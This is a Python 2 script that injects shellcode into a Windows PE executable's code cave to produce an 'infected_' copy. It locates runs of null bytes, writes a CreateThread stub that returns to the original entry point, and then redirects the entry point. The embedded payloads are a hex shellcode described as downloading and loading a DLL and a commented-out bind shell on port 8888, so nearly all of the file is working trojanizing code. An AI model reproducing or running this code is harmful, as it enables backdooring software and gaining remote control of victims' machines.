import pefile, binascii, struct, sys, ctypes

to_infect = sys.argv[1]

file = pefile.PE(to_infect) #Open file

#if hex(file.OPTIONAL_HEADER.Magic) == "0x20b": #Check bitness of program
#	exit("This script is designed for 32-bit executables only.")
	
image_base = file.OPTIONAL_HEADER.ImageBase
OEP = image_base+file.OPTIONAL_HEADER.AddressOfEntryPoint #Get original entry point
print "Original Entry Point is "+str(hex(OEP))

try:
	create_thread_shellcode_ASCII = "31C9648B71308B760C8B761C8B6E088B7E208B36384F1875F389EB8B533C01DA8B527801DA8B722001DE31C941AD01D881384372656175F48178047465546875EB8178087265616475E28B722401DE668B0C4E498B721C01DE8B148E01DA31C050505068AAAAAAAA5050FFD2"+"68"+binascii.hexlify(struct.pack("<I",OEP))+"C3"
	#Shellcode to create a thread. AAAAAAAA will be replaced with address of main shellcode.
	#struct.pack is used to little-endianize OEP.
except:
	exit("OEP is weird") #Shouldn't happen, but just in case

len_cts = len(binascii.unhexlify(create_thread_shellcode_ASCII)) #Get length of CreateThread shellcode
	

	
#shellcode_ASCII = "fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd56a085950e2fd4050405068ea0fdfe0ffd59768020022b889e66a10565768c2db3767ffd55768b7e938ffffd5576874ec3be1ffd5579768756e4d61ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5" #shellcode to bind a shell on port 8888

shellcode_ASCII = "CC31C9648B71308B760C8B761C8B5E088B7E208B36384F1875F38B533C01DA8B527801DA8B722001"
"DE31C941AD01D881384765745075F4817804726F634175EB8178086464726575E2CC8B722401DE66"
"8B0C4E498B721C01DE8B148E01DA89D6B8AFBB53EB35D7DE30EB506857696E455453FFD689C031C9"
"51B986E19CED81F1E399F9ED5168636D642E54FFD031C0FFD0" #shellcode to down- and load dll

shellcode = binascii.unhexlify(shellcode_ASCII) #Turn ASCII shellcode into string of bytes

cave_start = 0
cave_size = 0

with open(to_infect,"rb") as f: #Open infectee
	i = 0 #i is index
	while True:
		byte = f.read(1)
		if not byte: break #Read byte and exit if end of file
		i += 1
		#print str(i)+": "+binascii.hexlify(byte)+" Cave addr: "+str(cave_start)+" Cave size: "+str(cave_size) #Print debug info
		if byte == "\x00": #If read byte is null, we can start counting
			if cave_start == 0:
				cave_start = i #Set cave_start to current index if we aren't currently measuring another cave
			cave_size += 1 #Increment cave size
			
		if byte != "\x00":
			cave_start = 0 #If byte isn't null, it can't be start or part of a cave
			cave_size = 0
			
		if cave_size > len_cts+len(shellcode):
			break #Break out of the loop if we found a big enough cave
			
if cave_size < len_cts+len(shellcode):
	exit("No suitable cave found") #Self-explanatory

print cave_start
print "Cave start:  "+str(hex(image_base+cave_start))
print "Cave finish: "+str(hex(image_base+i)) #Some printy-interfacy stuff

exit()

#[Create thread][Return to OEP][Main shellcode]

start_of_main_shellcode = image_base+cave_start+len_cts #Calculate where main shellcode starts

create_thread_shellcode = binascii.unhexlify(create_thread_shellcode_ASCII.replace("AAAAAAAA",binascii.hexlify(struct.pack("<I",start_of_main_shellcode))))
#Replace AAAAAAAA in CreateThread with start of main shellcode (duh), and turn it into a string of bytes

file.set_bytes_at_offset(cave_start, create_thread_shellcode+shellcode) #Write shellcode to file starting at cave_start
print "Address of threader shellcode: "+hex(image_base+cave_start)
print "Address of main shellcode: "+hex(start_of_main_shellcode)
print "Wrote shellcode to cave"

file.OPTIONAL_HEADER.AddressOfEntryPoint = cave_start #Set entry point. For some reason we don't have to add IMAGE_BASE like with OEP.
print "Adjusted EP to "+str(hex(image_base+file.OPTIONAL_HEADER.AddressOfEntryPoint))

file.write("infected_"+to_infect) #Save file.
print "File saved to infected_"+to_infect
file.show_warnings()